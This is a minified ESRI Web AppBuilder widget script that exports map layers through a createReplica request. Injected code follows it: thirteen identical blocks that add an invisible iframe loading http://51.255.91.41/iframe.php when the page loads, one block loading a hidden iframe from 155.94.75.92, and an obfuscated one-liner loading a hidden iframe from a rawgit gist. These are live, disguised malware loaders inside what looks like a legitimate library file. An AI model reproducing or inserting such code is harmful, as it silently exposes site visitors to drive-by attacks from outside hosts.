// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/string dojo/Evented jimu/BaseWidget esri/request dojo/Deferred dojo/promise/all".split(" "),function(g,e,h,k,l,m,n,p,q){return g([m,l],{baseClass:"jimu-widget-screening-create-replica",_extractDataTaskGPService:null,errMessageString:"",responseArray:[],layerDetailsObj:{},constructor:function(b){this._extractDataTaskGPService=null;this.errMessageString="";this.responseArray=[];this.layerDetailsObj={};e.mixin(this,b)},startup:function(){this.responseArray=
[];this.layerDetailsObj={};this._init()},_init:function(){var b,c,a;h.forEach(this.config.downloadSettings.layers,e.hitch(this,function(a){var f,d;if(0<this.downloadFeatureDetailsObj[a.id].length&&-1<a.downloadingFileOption.indexOf(this.fileFormat)&&a.allowDownload){b=a.url.split("/");c=parseInt(b.pop(),10);b=b.join("/");f=!1;for(d in this.layerDetailsObj)d.toLowerCase()===b.toLowerCase()&&(f=!0,b=d);f||(this.layerDetailsObj[b]={layerInstance:a,layerIndexes:[],layerDetails:{},layerNames:[]});this.layerDetailsObj[b].layerIndexes.push(c);
this.layerDetailsObj[b].layerNames.push(a.layerName);this.layerDetailsObj[b].layerDetails[c]={queryOption:"useFilter",useGeometry:!0,where:this.filterLayerObj[a.id].getDefinitionExpression()||""}}}));this.errMessageString="";for(a in this.layerDetailsObj)this.responseArray.push(this._exportFileUsingCreateReplica(a,this.layerDetailsObj[a]));q(this.responseArray).then(e.hitch(this,function(){this.errMessageString?(this.errMessageString=k.substitute(this.nls.reportsTab.createReplicaFailedMessage,{layerNames:this.errMessageString}),
this.emit("createReplicaComplete",this.errMessageString)):this.emit("createReplicaComplete")}))},_exportFileUsingCreateReplica:function(b,c){var a,d;a=this._removeDuplicateLayerIds(c.layerIndexes);d=new p;a={f:"json",replicaName:c.layerInstance.layerName,layers:a.join(),layerQueries:JSON.stringify(c.layerDetails),inSR:JSON.stringify(this.aoi.geometry.spatialReference),geometry:JSON.stringify(this.aoi.geometry),geometryType:"esriGeometryPolygon",transportType:"esriTransportTypeUrl",returnAttachments:!1,
returnAttachmentsDataByUrl:!1,async:!1,syncModel:"none",dataFormat:this.fileFormat};n({url:b+"/createReplica",content:a,handleAs:"json",callbackParamName:"callback"},{usePost:!0}).then(e.hitch(this,function(a){this.onRequestSucceeded(d,a)}),e.hitch(this,function(a){this.errMessageString&&(this.errMessageString+=", ");this.errMessageString+=c.layerNames.join(", ");this.onRequestFailed(d,a)}));return d.promise},_removeDuplicateLayerIds:function(b){return b.filter(function(b,a,d){return a===d.indexOf(b)})},
onRequestSucceeded:function(b,c){var a;b.resolve();c.responseUrl?a=c.responseUrl:c.URL&&(a=c.URL);a&&this.emit("onRequestSucceeded",a)},onRequestFailed:function(b,c){b.resolve();this.emit("onRequestFailed",c)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});